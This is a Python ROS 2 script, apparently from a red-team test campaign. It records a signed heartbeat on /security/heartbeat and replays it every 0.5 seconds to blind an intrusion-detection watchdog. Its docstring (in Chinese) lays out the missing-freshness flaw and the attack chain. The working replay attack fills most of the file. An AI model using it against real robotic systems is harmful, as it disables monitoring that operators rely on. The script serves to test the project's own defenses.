#!/usr/bin/env python3
"""攻擊 N1 — /security/heartbeat replay attack.

威脅模型沒提到這個攻擊。漏洞分析：

    monitor_node._publish_heartbeat 每 2 秒簽章 publish:
        payload = f'hb|{time.time():.3f}'
        msg.data = sign_alert(payload, secret)    # HMAC over payload
        heartbeat_pub.publish(msg)

    intelligent_defense_node._hb_cb 收到後:
        payload = verify_alert(msg.data, secret)  # ← 只驗 HMAC
        if payload is None: return
        self._last_heartbeat_wall = time.monotonic()  # ← 不驗 payload 內 timestamp！

漏洞：HMAC 簽章保證「來自有 secret 的人」，但「沒有 nonce / freshness 檢查」
→ 攻擊者錄一筆合法心跳，無限重放 → IDS 永遠認為 monitor 在線

攻擊鏈：
    1. (L1 能力) 監聽 /security/heartbeat 1 次，存下一筆 signed bytes
    2. kill monitor_node（或假設 monitor 被打掛 / DoS）
    3. 攻擊者用「同樣的 signed bytes」每 0.5s 重 publish
    4. IDS D5 (heartbeat watchdog) 永遠不 fire → 攻擊者已殺掉防線之一

影響：威脅模型 G6 修補「kill monitor 會被抓」失效。
"""
import os
import sys
import threading
import time
import rclpy
from rclpy.executors import ExternalShutdownException

try:  # rclpy exposes RCLError under different paths across distros
    from rclpy._rclpy_pybind11 import RCLError
except ImportError:  # pragma: no cover - fallback for older rclpy
    RCLError = RuntimeError
from rclpy.node import Node
from rclpy.qos import DurabilityPolicy, QoSProfile, ReliabilityPolicy
from std_msgs.msg import String


class HeartbeatRecorderReplayer(Node):
    """先錄一筆心跳 → 切換成 replay 模式無限重送"""

    def __init__(self):
        super().__init__('attacker_hb_replay')
        # Must match the monitor's publisher, which the G6/N1 hardening moved to
        # RELIABLE + TRANSIENT_LOCAL. This script kept BEST_EFFORT and was never
        # updated, so DDS refused to deliver anything it published: the IDS
        # subscriber requests RELIABLE and a BEST_EFFORT publisher cannot serve
        # it. Every session logged "incompatible QoS ... No messages will be sent
        # to it" while the attacker counted successful replays, so all 100
        # heartbeat_replay sessions in the campaign tested nothing -- the replay
        # never reached the verifier and the nonce cache was never exercised.
        # Capture still worked because a RELIABLE publisher can serve a
        # BEST_EFFORT subscriber; only the replay direction was blocked.
        qos = QoSProfile(
            depth=1,
            reliability=ReliabilityPolicy.RELIABLE,
            durability=DurabilityPolicy.TRANSIENT_LOCAL,
        )
        self._captured: str | None = None
        self._capture_sub = self.create_subscription(
            String, '/security/heartbeat', self._on_capture, qos)
        # 同樣 QoS 偽裝成 monitor
        self._replay_pub = self.create_publisher(
            String, '/security/heartbeat', qos)
        self._replay_timer = None
        self._n = 0
        self.get_logger().warn('🎯 開始監聽 /security/heartbeat ...')

    def _on_capture(self, msg: String):
        if self._captured is not None:
            return
        self._captured = msg.data
        self.get_logger().error(
            f'📼 已捕獲簽章心跳 (len={len(msg.data)}): {msg.data[:80]}...'
        )
        # 銷毀 subscription，避免重複收到自己 replay 的訊息
        self.destroy_subscription(self._capture_sub)
        # 立刻切 replay 模式：每 0.5s 重發同一筆，遠快於 HEARTBEAT_TIMEOUT_SEC=10
        self._replay_timer = self.create_timer(0.5, self._replay)
        self.get_logger().error('🔁 切換為 REPLAY 模式：每 0.5s 重送同一筆心跳')

    def _replay(self):
        if self._captured is None:
            return
        m = String()
        m.data = self._captured
        self._replay_pub.publish(m)
        self._n += 1
        if self._n % 10 == 0:
            self.get_logger().warn(
                f'  已重放 {self._n} 次（IDS 視 monitor 為「活著」）'
            )


def main():
    rclpy.init()
    node = HeartbeatRecorderReplayer()
    deadline = time.monotonic() + (
        float(sys.argv[1]) if len(sys.argv) > 1 else 30.0
    )
    try:
        while rclpy.ok() and time.monotonic() < deadline:
            rclpy.spin_once(node, timeout_sec=0.5)
    except (KeyboardInterrupt, ExternalShutdownException, RCLError):
        pass
    finally:
        # 收尾必須在 Enforce 下也能乾淨退出。攻擊者沒有憑證，所以這個
        # RELIABLE + TRANSIENT_LOCAL writer 從來配不到訂閱者，destroy_node()
        # 可能卡在等待樣本處置；同時 rclpy 的訊號處理器可能已經先 shutdown 過，
        # 而 rclpy.ok() 與實際狀態之間有競爭，於是第二次呼叫丟出
        # "rcl_shutdown already called"。兩者合起來讓行程掛住，被 orchestrator
        # 在 40 秒預算後 SIGKILL，整場因此判 not_eligible:attack_process。
        # 這裡只改離開路徑，不改攻擊行為本身。
        if rclpy.ok():
            node.get_logger().error(
                f'⏹ 結束，總共重放 {node._n} 次'
            )
        # 收尾設硬上限，攻擊視窗不縮短。
        #
        # 實測 enforce heartbeat_replay 31 場：rc=0 有 28 場（約 40.2 秒），
        # 另有 2 場 SIGTERM、1 場 SIGKILL——收尾偶爾拖過 orchestrator 的預算，
        # 整場就被判 not_eligible:attack_process 而中止整批 campaign。
        #
        # 縮短攻擊時間可以避開，但那會讓這批與已完成的 91 場視窗長度不一致。
        # 攻擊本身此時已經結束，清理不該決定一場資料算不算數，所以改成在背景
        # 執行緒清理、最多等 2 秒，然後 os._exit(0) 直接退出。
        def _teardown() -> None:
            try:
                node.destroy_node()
            except Exception:
                pass
            try:
                if rclpy.ok():
                    rclpy.shutdown()
            except RCLError:
                pass

        worker = threading.Thread(target=_teardown, daemon=True)
        worker.start()
        worker.join(timeout=2.0)
        sys.stdout.flush()
        sys.stderr.flush()
        os._exit(0)


if __name__ == '__main__':
    main()
